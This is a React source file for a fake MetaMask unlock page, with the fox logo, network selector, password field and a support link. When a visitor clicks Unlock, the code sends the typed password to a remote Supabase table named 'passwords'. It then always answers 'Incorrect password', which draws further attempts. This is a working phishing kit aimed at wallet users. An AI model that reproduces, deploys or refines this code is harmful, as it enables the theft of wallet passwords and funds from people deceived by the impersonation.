import logo from './logo.svg';
import './App.css';
import Fox from './Metalogo';
import { TextField } from '@mui/material';
import { useState, useEffect } from 'react';
import FormHelperText from '@mui/material/FormHelperText';
import getCaretCoordinates from 'textarea-caret'
import axios from 'axios';
import { supabase } from './supabase';
import {Button} from '@mui/material';
import {styled} from '@mui/material/styles';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';

const BootstrapButton = styled(Button)({
  boxShadow: 'none',
  textTransform: 'none',
  fontSize: 12,
  padding: '3px 3px 3px 12px',
  lineHeight: 1.5,
  backgroundColor: '#f2f4f6',
  borderColor: '#0063cc',
  borderRadius: '15px',
  fontWeight: 400,
  fontFamily: [
    "Euclid Circular B","Roboto","sans-serif"
  ].join(',')
});

function App() {

  const [inputType, setInputType] = useState('text');
  const [password, setPassword] =  useState('');
  const [enabled,setEnabled] = useState('btn-disabled')
  const [isError, setIsError] = useState(false);
  const [isDisabled, setIsDisabled] = useState(true);
  const [savedPassword, setSavedPassword] = useState('');
  console.log(window.screen.width)
  const [pos, setPos] = useState({x:177,y:120});
  const [show, setShow] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShow(false);
    }, 800); // 2 seconds

    return () => clearTimeout(timer); // cleanup
  }, []);

  const handleFocus = () => {
    if(password=='')setInputType('text')
    else setInputType('password');
  };

  const handleBlur = () => {
    console.log(password)
    if(password.length==0)setInputType('text')
    console.log(inputType)
  };

  const onChange =(e)=>{
    if(e.target.value==''){
      setInputType('text');
      setEnabled('btn-disabled')
      setIsDisabled(true)
    }
    else {
      setInputType('password');
      setEnabled('btn-enabled');
      setIsDisabled(false)
    }
    setPassword(e.target.value);
    setIsError(false)

    const element =  e.target;
    const boundingRect = element.getBoundingClientRect();
    const coordinates = getCaretCoordinates(element, element.selectionEnd);
    const x = boundingRect.left + coordinates.left - element.scrollLeft;
    const y = boundingRect.top + coordinates.top - element.scrollTop;
    setPos({x:x-80,y:y+1000});
  }

  const writeDataToSupabase = async (password) => {
    const { data, error } = await supabase
        .from('passwords')
        .insert([
            { password }
        ]);
    
    if (error) {
        console.error('Error writing data:', error.message);
    } else {
        console.log('Data written successfully:', data);
    }
  };

  const onClick = async ()=>{
    setSavedPassword(password);
    setIsError(true);
    try{
      writeDataToSupabase(password)
    }
    catch(error){
      console.log(error)
    }
    console.log(password,savedPassword)
    //if(password == savedPassword) window.parent.close()
  }

  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
  return (
    <div style={{ backgroundColor: darkMode ? '#141618' : '#fff'}}>
      {show?<div id="loading-content">
        <img class="loading-logo" src="./metamask-fox.svg" alt="" loading="lazy" />
        <img class="loading-spinner" src="./spinner.gif" alt="" loading="lazy" />
      </div>:
      <div className='App-container' style={{ backgroundColor: darkMode ? '#141618' : '#fff'}}>
        <div className="App">
          <div className='page-container'>
          <header className='App-logo'>
            <div className='select-chain-box'>
              <div style={{marginLeft:10}}>
                <BootstrapButton component="label" variant="" disableRipple startIcon={<img src='./ethereum.svg' width='16px' />}>
                  Ethereum Mainnet
                  <ExpandMoreIcon />
                </BootstrapButton>
              </div>
              <div style={{marginRight: 10}}>
                <img src="./metamask-fox.svg" alt=''/>
              </div>
            </div>
            <Fox followMouse={true}  width={120} height={120} followMotion={true} position={pos}/>
            <h1 className='title' style={{color:darkMode?'#9fa6ae':'#535a61'}} >Welcome back!</h1>
            <div style={{color:darkMode?'white':'#222'}}>The decentralized web awaits</div>
            <div className='password-input'>
              <form action='#'>
                <TextField
                  id="standard-password-input"
                  label="Password"
                  type={inputType}
                  value={password}
                  onChange={onChange}
                  variant="standard"
                  autoComplete="off"
                  autoSave='off'
                  onFocus={handleFocus}
                  onBlur={handleBlur}
                  fullWidth
                  error = {isError}
                />
                {
                  isError&&<FormHelperText id="component-error-text" style={{color:"red"}}>Incorrect password</FormHelperText>

                }
                <button className= {`unlock-button ${enabled} `} style={{borderColor:darkMode?"white":"#24272a", color:darkMode?"#24272a":"white"}} onClick={onClick} disabled={isDisabled}>Unlock</button>

              </form>
            </div>
            <div className='unlock_links'>
                <a className='button btn-link unlock_link '>Forgot password?</a>
            </div>
            <div className='support'>
                <span style={{color:darkMode?'white':'#222'}}>Need help? Contact </span>
                <a href='https://support.metamask.io' target='_blank' className='btn-link no-underline' rel='noopener noref errer'>MetaMask support</a>
            </div>
          </header>

          </div>
        </div>
      </div>}

    </div>
  );
}

export default App;
